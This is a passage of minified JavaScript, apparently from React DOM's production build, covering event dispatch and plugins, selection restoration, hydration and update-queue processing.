function uh(e, t, n) {
    e === "focusin" ? (ru(), ar = t, wr = n, ar.attachEvent("onpropertychange", Nf)) : e === "focusout" && ru()
}

function ch(e) {
    if (e === "selectionchange" || e === "keyup" || e === "keydown") return fa(wr)
}

function fh(e, t) {
    if (e === "click") return fa(t)
}

function dh(e, t) {
    if (e === "input" || e === "change") return fa(t)
}

function ph(e, t) {
    return e === t && (e !== 0 || 1 / e === 1 / t) || e !== e && t !== t
}
var Qe = typeof Object.is == "function" ? Object.is : ph;

function kr(e, t) {
    if (Qe(e, t)) return !0;
    if (typeof e != "object" || e === null || typeof t != "object" || t === null) return !1;
    var n = Object.keys(e),
        r = Object.keys(t);
    if (n.length !== r.length) return !1;
    for (r = 0; r < n.length; r++) {
        var i = n[r];
        if (!dl.call(t, i) || !Qe(e[i], t[i])) return !1
    }
    return !0
}

function iu(e) {
    for (; e && e.firstChild;) e = e.firstChild;
    return e
}

function au(e, t) {
    var n = iu(e);
    e = 0;
    for (var r; n;) {
        if (n.nodeType === 3) {
            if (r = e + n.textContent.length, e <= t && r >= t) return {
                node: n,
                offset: t - e
            };
            e = r
        }
        e: {
            for (; n;) {
                if (n.nextSibling) {
                    n = n.nextSibling;
                    break e
                }
                n = n.parentNode
            }
            n = void 0
        }
        n = iu(n)
    }
}

function Pf(e, t) {
    return e && t ? e === t ? !0 : e && e.nodeType === 3 ? !1 : t && t.nodeType === 3 ? Pf(e, t.parentNode) : "contains" in e ? e.contains(t) : e.compareDocumentPosition ? !!(e.compareDocumentPosition(t) & 16) : !1 : !1
}

function jf() {
    for (var e = window, t = Ti(); t instanceof e.HTMLIFrameElement;) {
        try {
            var n = typeof t.contentWindow.location.href == "string"
        } catch {
            n = !1
        }
        if (n) e = t.contentWindow;
        else break;
        t = Ti(e.document)
    }
    return t
}

function Ho(e) {
    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return t && (t === "input" && (e.type === "text" || e.type === "search" || e.type === "tel" || e.type === "url" || e.type === "password") || t === "textarea" || e.contentEditable === "true")
}

function mh(e) {
    var t = jf(),
        n = e.focusedElem,
        r = e.selectionRange;
    if (t !== n && n && n.ownerDocument && Pf(n.ownerDocument.documentElement, n)) {
        if (r !== null && Ho(n)) {
            if (t = r.start, e = r.end, e === void 0 && (e = t), "selectionStart" in n) n.selectionStart = t, n.selectionEnd = Math.min(e, n.value.length);
            else if (e = (t = n.ownerDocument || document) && t.defaultView || window, e.getSelection) {
                e = e.getSelection();
                var i = n.textContent.length,
                    a = Math.min(r.start, i);
                r = r.end === void 0 ? a : Math.min(r.end, i), !e.extend && a > r && (i = r, r = a, a = i), i = au(n, a);
                var l = au(n, r);
                i && l && (e.rangeCount !== 1 || e.anchorNode !== i.node || e.anchorOffset !== i.offset || e.focusNode !== l.node || e.focusOffset !== l.offset) && (t = t.createRange(), t.setStart(i.node, i.offset), e.removeAllRanges(), a > r ? (e.addRange(t), e.extend(l.node, l.offset)) : (t.setEnd(l.node, l.offset), e.addRange(t)))
            }
        }
        for (t = [], e = n; e = e.parentNode;) e.nodeType === 1 && t.push({
            element: e,
            left: e.scrollLeft,
            top: e.scrollTop
        });
        for (typeof n.focus == "function" && n.focus(), n = 0; n < t.length; n++) e = t[n], e.element.scrollLeft = e.left, e.element.scrollTop = e.top
    }
}
var hh = it && "documentMode" in document && 11 >= document.documentMode,
    un = null,
    bl = null,
    lr = null,
    Tl = !1;

function lu(e, t, n) {
    var r = n.window === n ? n.document : n.nodeType === 9 ? n : n.ownerDocument;
    Tl || un == null || un !== Ti(r) || (r = un, "selectionStart" in r && Ho(r) ? r = {
        start: r.selectionStart,
        end: r.selectionEnd
    } : (r = (r.ownerDocument && r.ownerDocument.defaultView || window).getSelection(), r = {
        anchorNode: r.anchorNode,
        anchorOffset: r.anchorOffset,
        focusNode: r.focusNode,
        focusOffset: r.focusOffset
    }), lr && kr(lr, r) || (lr = r, r = _i(bl, "onSelect"), 0 < r.length && (t = new _o("onSelect", "select", null, t, n), e.push({
        event: t,
        listeners: r
    }), t.target = un)))
}

function ei(e, t) {
    var n = {};
    return n[e.toLowerCase()] = t.toLowerCase(), n["Webkit" + e] = "webkit" + t, n["Moz" + e] = "moz" + t, n
}
var cn = {
        animationend: ei("Animation", "AnimationEnd"),
        animationiteration: ei("Animation", "AnimationIteration"),
        animationstart: ei("Animation", "AnimationStart"),
        transitionend: ei("Transition", "TransitionEnd")
    },
    Qa = {},
    Af = {};
it && (Af = document.createElement("div").style, "AnimationEvent" in window || (delete cn.animationend.animation, delete cn.animationiteration.animation, delete cn.animationstart.animation), "TransitionEvent" in window || delete cn.transitionend.transition);

function da(e) {
    if (Qa[e]) return Qa[e];
    if (!cn[e]) return e;
    var t = cn[e],
        n;
    for (n in t)
        if (t.hasOwnProperty(n) && n in Af) return Qa[e] = t[n];
    return e
}
var If = da("animationend"),
    Of = da("animationiteration"),
    bf = da("animationstart"),
    Tf = da("transitionend"),
    zf = new Map,
    ou = "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");

function Rt(e, t) {
    zf.set(e, t), nn(t, [e])
}
for (var Ya = 0; Ya < ou.length; Ya++) {
    var Ka = ou[Ya],
        vh = Ka.toLowerCase(),
        gh = Ka[0].toUpperCase() + Ka.slice(1);
    Rt(vh, "on" + gh)
}
Rt(If, "onAnimationEnd");
Rt(Of, "onAnimationIteration");
Rt(bf, "onAnimationStart");
Rt("dblclick", "onDoubleClick");
Rt("focusin", "onFocus");
Rt("focusout", "onBlur");
Rt(Tf, "onTransitionEnd");
In("onMouseEnter", ["mouseout", "mouseover"]);
In("onMouseLeave", ["mouseout", "mouseover"]);
In("onPointerEnter", ["pointerout", "pointerover"]);
In("onPointerLeave", ["pointerout", "pointerover"]);
nn("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" "));
nn("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));
nn("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]);
nn("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" "));
nn("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" "));
nn("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
var er = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),
    yh = new Set("cancel close invalid load scroll toggle".split(" ").concat(er));

function su(e, t, n) {
    var r = e.type || "unknown-event";
    e.currentTarget = n, vm(r, t, void 0, e), e.currentTarget = null
}

function Lf(e, t) {
    t = (t & 4) !== 0;
    for (var n = 0; n < e.length; n++) {
        var r = e[n],
            i = r.event;
        r = r.listeners;
        e: {
            var a = void 0;
            if (t)
                for (var l = r.length - 1; 0 <= l; l--) {
                    var o = r[l],
                        s = o.instance,
                        u = o.currentTarget;
                    if (o = o.listener, s !== a && i.isPropagationStopped()) break e;
                    su(i, o, u), a = s
                } else
                    for (l = 0; l < r.length; l++) {
                        if (o = r[l], s = o.instance, u = o.currentTarget, o = o.listener, s !== a && i.isPropagationStopped()) break e;
                        su(i, o, u), a = s
                    }
        }
    }
    if (Li) throw e = jl, Li = !1, jl = null, e
}

function B(e, t) {
    var n = t[Dl];
    n === void 0 && (n = t[Dl] = new Set);
    var r = e + "__bubble";
    n.has(r) || (Rf(t, e, 2, !1), n.add(r))
}

function Ga(e, t, n) {
    var r = 0;
    t && (r |= 4), Rf(n, e, r, t)
}
var ti = "_reactListening" + Math.random().toString(36).slice(2);

function xr(e) {
    if (!e[ti]) {
        e[ti] = !0, Bc.forEach(function(n) {
            n !== "selectionchange" && (yh.has(n) || Ga(n, !1, e), Ga(n, !0, e))
        });
        var t = e.nodeType === 9 ? e : e.ownerDocument;
        t === null || t[ti] || (t[ti] = !0, Ga("selectionchange", !1, t))
    }
}

function Rf(e, t, n, r) {
    switch (yf(t)) {
        case 1:
            var i = Tm;
            break;
        case 4:
            i = zm;
            break;
        default:
            i = Do
    }
    n = i.bind(null, t, n, e), i = void 0, !Pl || t !== "touchstart" && t !== "touchmove" && t !== "wheel" || (i = !0), r ? i !== void 0 ? e.addEventListener(t, n, {
        capture: !0,
        passive: i
    }) : e.addEventListener(t, n, !0) : i !== void 0 ? e.addEventListener(t, n, {
        passive: i
    }) : e.addEventListener(t, n, !1)
}

function Za(e, t, n, r, i) {
    var a = r;
    if (!(t & 1) && !(t & 2) && r !== null) e: for (;;) {
        if (r === null) return;
        var l = r.tag;
        if (l === 3 || l === 4) {
            var o = r.stateNode.containerInfo;
            if (o === i || o.nodeType === 8 && o.parentNode === i) break;
            if (l === 4)
                for (l = r.return; l !== null;) {
                    var s = l.tag;
                    if ((s === 3 || s === 4) && (s = l.stateNode.containerInfo, s === i || s.nodeType === 8 && s.parentNode === i)) return;
                    l = l.return
                }
            for (; o !== null;) {
                if (l = Ht(o), l === null) return;
                if (s = l.tag, s === 5 || s === 6) {
                    r = a = l;
                    continue e
                }
                o = o.parentNode
            }
        }
        r = r.return
    }
    rf(function() {
        var u = a,
            f = zo(n),
            m = [];
        e: {
            var v = zf.get(e);
            if (v !== void 0) {
                var g = _o,
                    w = e;
                switch (e) {
                    case "keypress":
                        if (Si(n) === 0) break e;
                    case "keydown":
                    case "keyup":
                        g = Gm;
                        break;
                    case "focusin":
                        w = "focus", g = Ha;
                        break;
                    case "focusout":
                        w = "blur", g = Ha;
                        break;
                    case "beforeblur":
                    case "afterblur":
                        g = Ha;
                        break;
                    case "click":
                        if (n.button === 2) break e;
                    case "auxclick":
                    case "dblclick":
                    case "mousedown":
                    case "mousemove":
                    case "mouseup":
                    case "mouseout":
                    case "mouseover":
                    case "contextmenu":
                        g = Xs;
                        break;
                    case "drag":
                    case "dragend":
                    case "dragenter":
                    case "dragexit":
                    case "dragleave":
                    case "dragover":
                    case "dragstart":
                    case "drop":
                        g = Mm;
                        break;
                    case "touchcancel":
                    case "touchend":
                    case "touchmove":
                    case "touchstart":
                        g = Jm;
                        break;
                    case If:
                    case Of:
                    case bf:
                        g = _m;
                        break;
                    case Tf:
                        g = $m;
                        break;
                    case "scroll":
                        g = Lm;
                        break;
                    case "wheel":
                        g = th;
                        break;
                    case "copy":
                    case "cut":
                    case "paste":
                        g = Bm;
                        break;
                    case "gotpointercapture":
                    case "lostpointercapture":
                    case "pointercancel":
                    case "pointerdown":
                    case "pointermove":
                    case "pointerout":
                    case "pointerover":
                    case "pointerup":
                        g = qs
                }
                var k = (t & 4) !== 0,
                    E = !k && e === "scroll",
                    p = k ? v !== null ? v + "Capture" : null : v;
                k = [];
                for (var c = u, h; c !== null;) {
                    h = c;
                    var y = h.stateNode;
                    if (h.tag === 5 && y !== null && (h = y, p !== null && (y = hr(c, p), y != null && k.push(Sr(c, y, h)))), E) break;
                    c = c.return
                }
                0 < k.length && (v = new g(v, w, null, n, f), m.push({
                    event: v,
                    listeners: k
                }))
            }
        }
        if (!(t & 7)) {
            e: {
                if (v = e === "mouseover" || e === "pointerover", g = e === "mouseout" || e === "pointerout", v && n !== Cl && (w = n.relatedTarget || n.fromElement) && (Ht(w) || w[at])) break e;
                if ((g || v) && (v = f.window === f ? f : (v = f.ownerDocument) ? v.defaultView || v.parentWindow : window, g ? (w = n.relatedTarget || n.toElement, g = u, w = w ? Ht(w) : null, w !== null && (E = rn(w), w !== E || w.tag !== 5 && w.tag !== 6) && (w = null)) : (g = null, w = u), g !== w)) {
                    if (k = Xs, y = "onMouseLeave", p = "onMouseEnter", c = "mouse", (e === "pointerout" || e === "pointerover") && (k = qs, y = "onPointerLeave", p = "onPointerEnter", c = "pointer"), E = g == null ? v : fn(g), h = w == null ? v : fn(w), v = new k(y, c + "leave", g, n, f), v.target = E, v.relatedTarget = h, y = null, Ht(f) === u && (k = new k(p, c + "enter", w, n, f), k.target = h, k.relatedTarget = E, y = k), E = y, g && w) t: {
                        for (k = g, p = w, c = 0, h = k; h; h = an(h)) c++;
                        for (h = 0, y = p; y; y = an(y)) h++;
                        for (; 0 < c - h;) k = an(k),
                        c--;
                        for (; 0 < h - c;) p = an(p),
                        h--;
                        for (; c--;) {
                            if (k === p || p !== null && k === p.alternate) break t;
                            k = an(k), p = an(p)
                        }
                        k = null
                    }
                    else k = null;
                    g !== null && uu(m, v, g, k, !1), w !== null && E !== null && uu(m, E, w, k, !0)
                }
            }
            e: {
                if (v = u ? fn(u) : window, g = v.nodeName && v.nodeName.toLowerCase(), g === "select" || g === "input" && v.type === "file") var S = sh;
                else if (tu(v))
                    if (Cf) S = dh;
                    else {
                        S = ch;
                        var P = uh
                    }
                else(g = v.nodeName) && g.toLowerCase() === "input" && (v.type === "checkbox" || v.type === "radio") && (S = fh);
                if (S && (S = S(e, u))) {
                    Ef(m, S, n, f);
                    break e
                }
                P && P(e, v, u),
                e === "focusout" && (P = v._wrapperState) && P.controlled && v.type === "number" && wl(v, "number", v.value)
            }
            switch (P = u ? fn(u) : window, e) {
                case "focusin":
                    (tu(P) || P.contentEditable === "true") && (un = P, bl = u, lr = null);
                    break;
                case "focusout":
                    lr = bl = un = null;
                    break;
                case "mousedown":
                    Tl = !0;
                    break;
                case "contextmenu":
                case "mouseup":
                case "dragend":
                    Tl = !1, lu(m, n, f);
                    break;
                case "selectionchange":
                    if (hh) break;
                case "keydown":
                case "keyup":
                    lu(m, n, f)
            }
            var j;
            if (Bo) e: {
                switch (e) {
                    case "compositionstart":
                        var O = "onCompositionStart";
                        break e;
                    case "compositionend":
                        O = "onCompositionEnd";
                        break e;
                    case "compositionupdate":
                        O = "onCompositionUpdate";
                        break e
                }
                O = void 0
            }
            else sn ? xf(e, n) && (O = "onCompositionEnd") : e === "keydown" && n.keyCode === 229 && (O = "onCompositionStart");O && (kf && n.locale !== "ko" && (sn || O !== "onCompositionStart" ? O === "onCompositionEnd" && sn && (j = wf()) : (wt = f, Fo = "value" in wt ? wt.value : wt.textContent, sn = !0)), P = _i(u, O), 0 < P.length && (O = new Js(O, e, null, n, f), m.push({
                event: O,
                listeners: P
            }), j ? O.data = j : (j = Sf(n), j !== null && (O.data = j)))),
            (j = rh ? ih(e, n) : ah(e, n)) && (u = _i(u, "onBeforeInput"), 0 < u.length && (f = new Js("onBeforeInput", "beforeinput", null, n, f), m.push({
                event: f,
                listeners: u
            }), f.data = j))
        }
        Lf(m, t)
    })
}

function Sr(e, t, n) {
    return {
        instance: e,
        listener: t,
        currentTarget: n
    }
}

function _i(e, t) {
    for (var n = t + "Capture", r = []; e !== null;) {
        var i = e,
            a = i.stateNode;
        i.tag === 5 && a !== null && (i = a, a = hr(e, n), a != null && r.unshift(Sr(e, a, i)), a = hr(e, t), a != null && r.push(Sr(e, a, i))), e = e.return
    }
    return r
}

function an(e) {
    if (e === null) return null;
    do e = e.return; while (e && e.tag !== 5);
    return e || null
}

function uu(e, t, n, r, i) {
    for (var a = t._reactName, l = []; n !== null && n !== r;) {
        var o = n,
            s = o.alternate,
            u = o.stateNode;
        if (s !== null && s === r) break;
        o.tag === 5 && u !== null && (o = u, i ? (s = hr(n, a), s != null && l.unshift(Sr(n, s, o))) : i || (s = hr(n, a), s != null && l.push(Sr(n, s, o)))), n = n.return
    }
    l.length !== 0 && e.push({
        event: t,
        listeners: l
    })
}
var wh = /\r\n?/g,
    kh = /\u0000|\uFFFD/g;

function cu(e) {
    return (typeof e == "string" ? e : "" + e).replace(wh, `
`).replace(kh, "")
}

function ni(e, t, n) {
    if (t = cu(t), cu(e) !== t && n) throw Error(x(425))
}

function Ui() {}
var zl = null,
    Ll = null;

function Rl(e, t) {
    return e === "textarea" || e === "noscript" || typeof t.children == "string" || typeof t.children == "number" || typeof t.dangerouslySetInnerHTML == "object" && t.dangerouslySetInnerHTML !== null && t.dangerouslySetInnerHTML.__html != null
}
var Ml = typeof setTimeout == "function" ? setTimeout : void 0,
    xh = typeof clearTimeout == "function" ? clearTimeout : void 0,
    fu = typeof Promise == "function" ? Promise : void 0,
    Sh = typeof queueMicrotask == "function" ? queueMicrotask : typeof fu < "u" ? function(e) {
        return fu.resolve(null).then(e).catch(Eh)
    } : Ml;

function Eh(e) {
    setTimeout(function() {
        throw e
    })
}

function Xa(e, t) {
    var n = t,
        r = 0;
    do {
        var i = n.nextSibling;
        if (e.removeChild(n), i && i.nodeType === 8)
            if (n = i.data, n === "/$") {
                if (r === 0) {
                    e.removeChild(i), yr(t);
                    return
                }
                r--
            } else n !== "$" && n !== "$?" && n !== "$!" || r++;
        n = i
    } while (n);
    yr(t)
}

function Nt(e) {
    for (; e != null; e = e.nextSibling) {
        var t = e.nodeType;
        if (t === 1 || t === 3) break;
        if (t === 8) {
            if (t = e.data, t === "$" || t === "$!" || t === "$?") break;
            if (t === "/$") return null
        }
    }
    return e
}

function du(e) {
    e = e.previousSibling;
    for (var t = 0; e;) {
        if (e.nodeType === 8) {
            var n = e.data;
            if (n === "$" || n === "$!" || n === "$?") {
                if (t === 0) return e;
                t--
            } else n === "/$" && t++
        }
        e = e.previousSibling
    }
    return null
}
var _n = Math.random().toString(36).slice(2),
    Ze = "__reactFiber$" + _n,
    Er = "__reactProps$" + _n,
    at = "__reactContainer$" + _n,
    Dl = "__reactEvents$" + _n,
    Ch = "__reactListeners$" + _n,
    Nh = "__reactHandles$" + _n;

function Ht(e) {
    var t = e[Ze];
    if (t) return t;
    for (var n = e.parentNode; n;) {
        if (t = n[at] || n[Ze]) {
            if (n = t.alternate, t.child !== null || n !== null && n.child !== null)
                for (e = du(e); e !== null;) {
                    if (n = e[Ze]) return n;
                    e = du(e)
                }
            return t
        }
        e = n, n = e.parentNode
    }
    return null
}

function _r(e) {
    return e = e[Ze] || e[at], !e || e.tag !== 5 && e.tag !== 6 && e.tag !== 13 && e.tag !== 3 ? null : e
}

function fn(e) {
    if (e.tag === 5 || e.tag === 6) return e.stateNode;
    throw Error(x(33))
}

function pa(e) {
    return e[Er] || null
}
var Fl = [],
    dn = -1;

function Mt(e) {
    return {
        current: e
    }
}

function V(e) {
    0 > dn || (e.current = Fl[dn], Fl[dn] = null, dn--)
}

function U(e, t) {
    dn++, Fl[dn] = e.current, e.current = t
}
var bt = {},
    pe = Mt(bt),
    ke = Mt(!1),
    Zt = bt;

function On(e, t) {
    var n = e.type.contextTypes;
    if (!n) return bt;
    var r = e.stateNode;
    if (r && r.__reactInternalMemoizedUnmaskedChildContext === t) return r.__reactInternalMemoizedMaskedChildContext;
    var i = {},
        a;
    for (a in n) i[a] = t[a];
    return r && (e = e.stateNode, e.__reactInternalMemoizedUnmaskedChildContext = t, e.__reactInternalMemoizedMaskedChildContext = i), i
}

function xe(e) {
    return e = e.childContextTypes, e != null
}

function Bi() {
    V(ke), V(pe)
}

function pu(e, t, n) {
    if (pe.current !== bt) throw Error(x(168));
    U(pe, t), U(ke, n)
}

function Mf(e, t, n) {
    var r = e.stateNode;
    if (t = t.childContextTypes, typeof r.getChildContext != "function") return n;
    r = r.getChildContext();
    for (var i in r)
        if (!(i in t)) throw Error(x(108, um(e) || "Unknown", i));
    return G({}, n, r)
}

function Hi(e) {
    return e = (e = e.stateNode) && e.__reactInternalMemoizedMergedChildContext || bt, Zt = pe.current, U(pe, e), U(ke, ke.current), !0
}

function mu(e, t, n) {
    var r = e.stateNode;
    if (!r) throw Error(x(169));
    n ? (e = Mf(e, t, Zt), r.__reactInternalMemoizedMergedChildContext = e, V(ke), V(pe), U(pe, e)) : V(ke), U(ke, n)
}
var et = null,
    ma = !1,
    Ja = !1;

function Df(e) {
    et === null ? et = [e] : et.push(e)
}

function Ph(e) {
    ma = !0, Df(e)
}

function Dt() {
    if (!Ja && et !== null) {
        Ja = !0;
        var e = 0,
            t = _;
        try {
            var n = et;
            for (_ = 1; e < n.length; e++) {
                var r = n[e];
                do r = r(!0); while (r !== null)
            }
            et = null, ma = !1
        } catch (i) {
            throw et !== null && (et = et.slice(e + 1)), sf(Lo, Dt), i
        } finally {
            _ = t, Ja = !1
        }
    }
    return null
}
var pn = [],
    mn = 0,
    Vi = null,
    Wi = 0,
    be = [],
    Te = 0,
    Xt = null,
    tt = 1,
    nt = "";

function Ut(e, t) {
    pn[mn++] = Wi, pn[mn++] = Vi, Vi = e, Wi = t
}

function Ff(e, t, n) {
    be[Te++] = tt, be[Te++] = nt, be[Te++] = Xt, Xt = e;
    var r = tt;
    e = nt;
    var i = 32 - Ve(r) - 1;
    r &= ~(1 << i), n += 1;
    var a = 32 - Ve(t) + i;
    if (30 < a) {
        var l = i - i % 5;
        a = (r & (1 << l) - 1).toString(32), r >>= l, i -= l, tt = 1 << 32 - Ve(t) + i | n << i | r, nt = a + e
    } else tt = 1 << a | n << i | r, nt = e
}

function Vo(e) {
    e.return !== null && (Ut(e, 1), Ff(e, 1, 0))
}

function Wo(e) {
    for (; e === Vi;) Vi = pn[--mn], pn[mn] = null, Wi = pn[--mn], pn[mn] = null;
    for (; e === Xt;) Xt = be[--Te], be[Te] = null, nt = be[--Te], be[Te] = null, tt = be[--Te], be[Te] = null
}
var Pe = null,
    Ne = null,
    Q = !1,
    Be = null;

function _f(e, t) {
    var n = ze(5, null, null, 0);
    n.elementType = "DELETED", n.stateNode = t, n.return = e, t = e.deletions, t === null ? (e.deletions = [n], e.flags |= 16) : t.push(n)
}

function hu(e, t) {
    switch (e.tag) {
        case 5:
            var n = e.type;
            return t = t.nodeType !== 1 || n.toLowerCase() !== t.nodeName.toLowerCase() ? null : t, t !== null ? (e.stateNode = t, Pe = e, Ne = Nt(t.firstChild), !0) : !1;
        case 6:
            return t = e.pendingProps === "" || t.nodeType !== 3 ? null : t, t !== null ? (e.stateNode = t, Pe = e, Ne = null, !0) : !1;
        case 13:
            return t = t.nodeType !== 8 ? null : t, t !== null ? (n = Xt !== null ? {
                id: tt,
                overflow: nt
            } : null, e.memoizedState = {
                dehydrated: t,
                treeContext: n,
                retryLane: 1073741824
            }, n = ze(18, null, null, 0), n.stateNode = t, n.return = e, e.child = n, Pe = e, Ne = null, !0) : !1;
        default:
            return !1
    }
}

function _l(e) {
    return (e.mode & 1) !== 0 && (e.flags & 128) === 0
}

function Ul(e) {
    if (Q) {
        var t = Ne;
        if (t) {
            var n = t;
            if (!hu(e, t)) {
                if (_l(e)) throw Error(x(418));
                t = Nt(n.nextSibling);
                var r = Pe;
                t && hu(e, t) ? _f(r, n) : (e.flags = e.flags & -4097 | 2, Q = !1, Pe = e)
            }
        } else {
            if (_l(e)) throw Error(x(418));
            e.flags = e.flags & -4097 | 2, Q = !1, Pe = e
        }
    }
}

function vu(e) {
    for (e = e.return; e !== null && e.tag !== 5 && e.tag !== 3 && e.tag !== 13;) e = e.return;
    Pe = e
}

function ri(e) {
    if (e !== Pe) return !1;
    if (!Q) return vu(e), Q = !0, !1;
    var t;
    if ((t = e.tag !== 3) && !(t = e.tag !== 5) && (t = e.type, t = t !== "head" && t !== "body" && !Rl(e.type, e.memoizedProps)), t && (t = Ne)) {
        if (_l(e)) throw Uf(), Error(x(418));
        for (; t;) _f(e, t), t = Nt(t.nextSibling)
    }
    if (vu(e), e.tag === 13) {
        if (e = e.memoizedState, e = e !== null ? e.dehydrated : null, !e) throw Error(x(317));
        e: {
            for (e = e.nextSibling, t = 0; e;) {
                if (e.nodeType === 8) {
                    var n = e.data;
                    if (n === "/$") {
                        if (t === 0) {
                            Ne = Nt(e.nextSibling);
                            break e
                        }
                        t--
                    } else n !== "$" && n !== "$!" && n !== "$?" || t++
                }
                e = e.nextSibling
            }
            Ne = null
        }
    } else Ne = Pe ? Nt(e.stateNode.nextSibling) : null;
    return !0
}

function Uf() {
    for (var e = Ne; e;) e = Nt(e.nextSibling)
}

function bn() {
    Ne = Pe = null, Q = !1
}

function Qo(e) {
    Be === null ? Be = [e] : Be.push(e)
}
var jh = ft.ReactCurrentBatchConfig;

function _e(e, t) {
    if (e && e.defaultProps) {
        t = G({}, t), e = e.defaultProps;
        for (var n in e) t[n] === void 0 && (t[n] = e[n]);
        return t
    }
    return t
}
var Qi = Mt(null),
    Yi = null,
    hn = null,
    Yo = null;

function Ko() {
    Yo = hn = Yi = null
}

function Go(e) {
    var t = Qi.current;
    V(Qi), e._currentValue = t
}

function Bl(e, t, n) {
    for (; e !== null;) {
        var r = e.alternate;
        if ((e.childLanes & t) !== t ? (e.childLanes |= t, r !== null && (r.childLanes |= t)) : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t), e === n) break;
        e = e.return
    }
}

function Nn(e, t) {
    Yi = e, Yo = hn = null, e = e.dependencies, e !== null && e.firstContext !== null && (e.lanes & t && (we = !0), e.firstContext = null)
}

function Re(e) {
    var t = e._currentValue;
    if (Yo !== e)
        if (e = {
                context: e,
                memoizedValue: t,
                next: null
            }, hn === null) {
            if (Yi === null) throw Error(x(308));
            hn = e, Yi.dependencies = {
                lanes: 0,
                firstContext: e
            }
        } else hn = hn.next = e;
    return t
}
var Vt = null;

function Zo(e) {
    Vt === null ? Vt = [e] : Vt.push(e)
}

function Bf(e, t, n, r) {
    var i = t.interleaved;
    return i === null ? (n.next = n, Zo(t)) : (n.next = i.next, i.next = n), t.interleaved = n, lt(e, r)
}

function lt(e, t) {
    e.lanes |= t;
    var n = e.alternate;
    for (n !== null && (n.lanes |= t), n = e, e = e.return; e !== null;) e.childLanes |= t, n = e.alternate, n !== null && (n.childLanes |= t), n = e, e = e.return;
    return n.tag === 3 ? n.stateNode : null
}
var vt = !1;

function Xo(e) {
    e.updateQueue = {
        baseState: e.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: {
            pending: null,
            interleaved: null,
            lanes: 0
        },
        effects: null
    }
}

function Hf(e, t) {
    e = e.updateQueue, t.updateQueue === e && (t.updateQueue = {
        baseState: e.baseState,
        firstBaseUpdate: e.firstBaseUpdate,
        lastBaseUpdate: e.lastBaseUpdate,
        shared: e.shared,
        effects: e.effects
    })
}

function rt(e, t) {
    return {
        eventTime: e,
        lane: t,
        tag: 0,
        payload: null,
        callback: null,
        next: null
    }
}

function Pt(e, t, n) {
    var r = e.updateQueue;
    if (r === null) return null;
    if (r = r.shared, D & 2) {
        var i = r.pending;
        return i === null ? t.next = t : (t.next = i.next, i.next = t), r.pending = t, lt(e, n)
    }
    return i = r.interleaved, i === null ? (t.next = t, Zo(r)) : (t.next = i.next, i.next = t), r.interleaved = t, lt(e, n)
}

function Ei(e, t, n) {
    if (t = t.updateQueue, t !== null && (t = t.shared, (n & 4194240) !== 0)) {
        var r = t.lanes;
        r &= e.pendingLanes, n |= r, t.lanes = n, Ro(e, n)
    }
}

function gu(e, t) {
    var n = e.updateQueue,
        r = e.alternate;
    if (r !== null && (r = r.updateQueue, n === r)) {
        var i = null,
            a = null;
        if (n = n.firstBaseUpdate, n !== null) {
            do {
                var l = {
                    eventTime: n.eventTime,
                    lane: n.lane,
                    tag: n.tag,
                    payload: n.payload,
                    callback: n.callback,
                    next: null
                };
                a === null ? i = a = l : a = a.next = l, n = n.next
            } while (n !== null);
            a === null ? i = a = t : a = a.next = t
        } else i = a = t;
        n = {
            baseState: r.baseState,
            firstBaseUpdate: i,
            lastBaseUpdate: a,
            shared: r.shared,
            effects: r.effects
        }, e.updateQueue = n;
        return
    }
    e = n.lastBaseUpdate, e === null ? n.firstBaseUpdate = t : e.next = t, n.lastBaseUpdate = t
}

function Ki(e, t, n, r) {
    var i = e.updateQueue;
    vt = !1;
    var a = i.firstBaseUpdate,
        l = i.lastBaseUpdate,
        o = i.shared.pending;
    if (o !== null) {
        i.shared.pending = null;
        var s = o,
            u = s.next;
        s.next = null, l === null ? a = u : l.next = u, l = s;
        var f = e.alternate;
        f !== null && (f = f.updateQueue, o = f.lastBaseUpdate, o !== l && (o === null ? f.firstBaseUpdate = u : o.next = u, f.lastBaseUpdate = s))
    }
    if (a !== null) {
        var m = i.baseState;
        l = 0, f = u = s = null, o = a;
        do {
            var v = o.lane,
                g = o.eventTime;
            if ((r & v) === v) {
                f !== null && (f = f.next = {
                    eventTime: g,
                    lane: 0,
                    tag: o.tag,
                    payload: o.payload,
                    callback: o.callback,
                    next: null
                });
                e: {
                    var w = e,
                        k = o;
                    switch (v = t, g = n, k.tag) {
                        case 1:
                            if (w = k.payload, typeof w == "function") {
                                m = w.call(g, m, v);
                                break e
                            }
                            m = w;
                            break e;
                        case 3:
                            w.flags = w.flags & -65537 | 128;
                        case 0:
                            if (w = k.payload, v = typeof w == "function" ? w.call(g, m, v) : w, v == null) break e;
                            m = G({}, m, v);
                            break e;
                        case 2:
                            vt = !0
                    }
                }
                o.callback !== null && o.lane !== 0 && (e.flags |= 64, v = i.effects, v === null ? i.effects = [o] : v.push(o))
            } else g = {
                eventTime: g,
                lane: v,
                tag: o.tag,
                payload: o.payload,
                callback: o.callback,
                next: null
            }, f === null ? (u = f = g, s = m) : f = f.next = g, l |= v;
            if (o = o.next, o === null) {
                if (o = i.shared.pending, o === null) break;
                v = o, o = v.next, v.next = null, i.lastBaseUpdate = v, i.shared.pending = null
            }
        } while (1);
        if (f === null && (s = m), i.baseState = s, i.firstBaseUpdate = u, i.lastBaseUpdate = f, t = i.shared.interleaved, t !== null) {
            i = t;
            do l |= i.lane, i = i.next; while (i !== t)
        } else a === null && (i.shared.lanes = 0);
        qt |= l, e.lanes = l, e.memoizedState = m
    }
}

